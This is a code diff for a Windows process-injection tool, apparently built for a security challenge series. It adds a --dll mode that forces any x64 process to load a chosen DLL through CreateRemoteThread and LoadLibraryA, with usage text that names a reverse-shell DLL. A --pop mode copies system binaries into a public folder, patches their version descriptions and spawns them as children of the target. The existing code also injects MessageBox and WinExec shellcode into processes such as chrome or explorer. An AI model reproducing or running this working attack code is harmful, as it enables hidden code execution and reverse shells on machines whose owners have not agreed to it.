@@ -173,21 +173,21 @@ static bool is_all_digits(const char* s) {
 
 static void usage(const char* prog) {
     printf("Usage:\n");
-    printf("  %s                                 MVTC -> MessageBox (default text)\n", prog);
-    printf("  %s <target>                        target -> MessageBox (default text)\n", prog);
-    printf("  %s <target> \"your message\"         target -> MessageBox with YOUR text\n", prog);
-    printf("  %s <target> --spawn <program>      target -> spawn <program> as child\n", prog);
-    printf("  %s --list                          list every injectable process\n", prog);
-    printf("  %s --help                          this help\n\n", prog);
-    printf("Target is a PID or a process name. Works on ANY x64 app you can open.\n\n");
+    printf("  %s                             MVTC -> MessageBox (default text)\n", prog);
+    printf("  %s <target>                    target -> MessageBox\n", prog);
+    printf("  %s <target> \"message\"          target -> MessageBox with text\n", prog);
+    printf("  %s <target> --spawn <prog>     target -> spawn <prog> as child\n", prog);
+    printf("  %s <target> --pop <app>        target -> calc/notepad/paint w/ custom name\n", prog);
+    printf("  %s <target> --dll <path>       target -> LoadLibrary(path) (revshell)\n", prog);
+    printf("  %s --list                      list every injectable process\n", prog);
+    printf("  %s --help                      this help\n\n", prog);
+    printf("Target is a PID or process name. Works on ANY x64 app you can open.\n\n");
     printf("Examples:\n");
-    printf("  %s                                 default pop into MVTC\n", prog);
-    printf("  %s --list                          see what you can inject into\n", prog);
-    printf("  %s chrome                          default pop into chrome\n", prog);
-    printf("  %s explorer \"I was here\"            custom message in explorer\n", prog);
-    printf("  %s 1234 \"PWNED by m14r41\"           custom message in PID 1234\n", prog);
-    printf("  %s MVTC --spawn notepad.exe        spawn notepad as MVTC's child\n", prog);
-    printf("  %s MVTC --spawn \"cmd /k whoami\"    pop a cmd as MVTC's child\n", prog);
+    printf("  %s --list\n", prog);
+    printf("  %s chrome\n", prog);
+    printf("  %s explorer \"I was here\"\n", prog);
+    printf("  %s MVTC --spawn notepad.exe\n", prog);
+    printf("  %s MVTC --dll C:\\path\\to\\revshell_pure_dll.dll\n", prog);
 }
 
 // Build shellcode that calls WinExec("program", SW_SHOWNORMAL); ret
@@ -255,11 +255,56 @@ static unsigned char* build_msgbox_shellcode(const char* text, size_t* outLen) {
     return sc;
 }
 
+// --pop <appname>: pre-rename a system binary with a custom FileDescription,
+// then spawn it. Child appears in Task Manager with the custom identifier.
+struct PopApp {
+    const char* name;              // flag value ("calc"/"notepad"/"paint")
+    const char* system_path;       // full path to the system binary
+    const char* renamed_name;      // what to drop as (shown as Image Name)
+    const wchar_t* needle;         // original FileDescription in VERSIONINFO
+    const wchar_t* new_desc;       // our replacement (<=25 UTF-16 chars)
+};
+static const PopApp POP_APPS[] = {
+    { "notepad", "C:\\Windows\\System32\\notepad.exe",      "RevShell_Note.exe",
+      L"Notepad",                               L"RevShell-PopNotepad" },
+    { "calc",    "C:\\Windows\\System32\\win32calc.exe",   "RevShell_Calc.exe",
+      L"Windows Calculator",                     L"RevShell-PopCalc"    },
+    { "paint",   "C:\\Windows\\System32\\mspaint.exe",     "RevShell_Paint.exe",
+      L"Paint",                                  L"RevShell-PopPaint"   },
+};
+
+// Byte-patch UTF-16 needle -> new_desc anywhere in the file.
+static int patch_desc_in_file(const char* path, const wchar_t* needle, const wchar_t* new_desc) {
+    HANDLE h = CreateFileA(path, GENERIC_READ | GENERIC_WRITE, 0, nullptr,
+                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+    if (h == INVALID_HANDLE_VALUE) return 0;
+    DWORD size = GetFileSize(h, nullptr);
+    BYTE* buf = (BYTE*)HeapAlloc(GetProcessHeap(), 0, size);
+    DWORD r = 0; ReadFile(h, buf, size, &r, nullptr);
+    size_t nl = wcslen(needle) * 2, rl = wcslen(new_desc) * 2;
+    int patched = 0;
+    if (rl <= nl) {
+        for (DWORD i = 0; i + (DWORD)nl <= size; i++) {
+            if (memcmp(buf + i, needle, nl) == 0) {
+                memcpy(buf + i, new_desc, rl);
+                for (size_t j = rl; j < nl; j++) buf[i + j] = 0;
+                patched = 1;
+            }
+        }
+    }
+    if (patched) { SetFilePointer(h, 0, nullptr, FILE_BEGIN); DWORD w; WriteFile(h, buf, size, &w, nullptr); }
+    HeapFree(GetProcessHeap(), 0, buf);
+    CloseHandle(h);
+    return patched;
+}
+
 int main(int argc, char** argv) {
     const char* target_arg = nullptr;
     const char* spawn_cmd  = nullptr;
     bool msg_mode = true;                    // default: MessageBox
     const char* custom_msg = nullptr;
+    const char* dll_path = nullptr;          // --dll path mode (reverse shell etc.)
+    const char* pop_app = nullptr;           // --pop <calc|notepad|paint>
 
     for (int i = 1; i < argc; i++) {
         if (strcmp(argv[i], "--list") == 0 || strcmp(argv[i], "-l") == 0) {
@@ -278,6 +323,14 @@ int main(int argc, char** argv) {
                 custom_msg = argv[i + 1];
                 i++;
             }
+        } else if (strcmp(argv[i], "--dll") == 0 || strcmp(argv[i], "-d") == 0) {
+            msg_mode = false;
+            if (i + 1 < argc) { dll_path = argv[i + 1]; i++; }
+            else { printf("[!] --dll needs a path\n"); return 1; }
+        } else if (strcmp(argv[i], "--pop") == 0 || strcmp(argv[i], "-p") == 0) {
+            msg_mode = false;
+            if (i + 1 < argc) { pop_app = argv[i + 1]; i++; }
+            else { printf("[!] --pop needs an app name (calc/notepad/paint)\n"); return 1; }
         } else if (!target_arg) {
             target_arg = argv[i];
         } else {
@@ -285,7 +338,7 @@ int main(int argc, char** argv) {
             msg_mode = true;
         }
     }
-    if (!spawn_cmd && !msg_mode) spawn_cmd = "notepad.exe";
+    if (!spawn_cmd && !dll_path && !msg_mode) spawn_cmd = "notepad.exe";
 
     // Ensure user32.dll is loaded in THIS process so GetProcAddress returns a
     // valid base - and so the address matches what the target already has.
@@ -312,6 +365,66 @@ int main(int argc, char** argv) {
     unsigned char* sc = nullptr;
     size_t sclen = 0;
     char default_msg[512];
+    char pop_decoy_path[MAX_PATH] = {};  // used only for --pop mode
+
+    // --pop <app> mode: copy a system binary to C:\Users\Public\RevShell_<x>.exe,
+    // patch its FileDescription, then build spawn shellcode pointing at the copy.
+    // Child appears in Task Manager with a custom name under the host.
+    if (pop_app) {
+        const PopApp* chosen = nullptr;
+        for (size_t i = 0; i < sizeof(POP_APPS)/sizeof(POP_APPS[0]); i++) {
+            if (_stricmp(pop_app, POP_APPS[i].name) == 0) { chosen = &POP_APPS[i]; break; }
+        }
+        if (!chosen) {
+            printf("[!] unknown --pop app '%s'. Options: calc, notepad, paint\n", pop_app);
+            system("pause"); return 1;
+        }
+        _snprintf_s(pop_decoy_path, _TRUNCATE,
+                    "C:\\Users\\Public\\%s", chosen->renamed_name);
+        printf("[+] mode: --pop %s\n", chosen->name);
+        printf("[+] Copying %s -> %s\n", chosen->system_path, pop_decoy_path);
+        if (!CopyFileA(chosen->system_path, pop_decoy_path, FALSE)) {
+            printf("[!] CopyFile failed (%lu). Does %s exist on this box?\n",
+                   GetLastError(), chosen->system_path);
+            system("pause"); return 1;
+        }
+        if (patch_desc_in_file(pop_decoy_path, chosen->needle, chosen->new_desc)) {
+            wprintf(L"[+] Patched FileDescription -> %s\n", chosen->new_desc);
+        } else {
+            printf("[!] FileDescription patch skipped (version info not matching needle)\n");
+        }
+        // Use existing WinExec spawn-shellcode builder with the renamed path.
+        spawn_cmd = pop_decoy_path;
+    }
+
+    // --dll mode: use classic CreateRemoteThread(LoadLibraryA, path) chain,
+    // same shape as challenge #13. No shellcode build needed.
+    if (dll_path) {
+        char fullDll[MAX_PATH];
+        if (!GetFullPathNameA(dll_path, MAX_PATH, fullDll, nullptr)) {
+            printf("[!] can't resolve DLL path: %s\n", dll_path);
+            system("pause"); return 2;
+        }
+        printf("[+] mode: DLL inject  path: %s\n", fullDll);
+
+        HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
+        if (!hProc) { printf("[!] OpenProcess %lu\n", GetLastError()); system("pause"); return 3; }
+        size_t len = strlen(fullDll) + 1;
+        LPVOID buf = VirtualAllocEx(hProc, nullptr, len,
+                                    MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+        WriteProcessMemory(hProc, buf, fullDll, len, nullptr);
+        LPTHREAD_START_ROUTINE llA = (LPTHREAD_START_ROUTINE)GetProcAddress(
+            GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
+        HANDLE hT = CreateRemoteThread(hProc, nullptr, 0, llA, buf, 0, nullptr);
+        if (!hT) { printf("[!] CreateRemoteThread %lu\n", GetLastError()); CloseHandle(hProc); system("pause"); return 4; }
+        WaitForSingleObject(hT, 10000);
+        DWORD hmod = 0; GetExitCodeThread(hT, &hmod);
+        printf("[+] remote LoadLibrary returned HMODULE 0x%lx\n", hmod);
+        CloseHandle(hT); CloseHandle(hProc);
+        printf("\n[+] DONE. DLL loaded inside %s.\n", host_name);
+        system("pause");
+        return 0;
+    }
 
     if (msg_mode) {
         if (!custom_msg) {
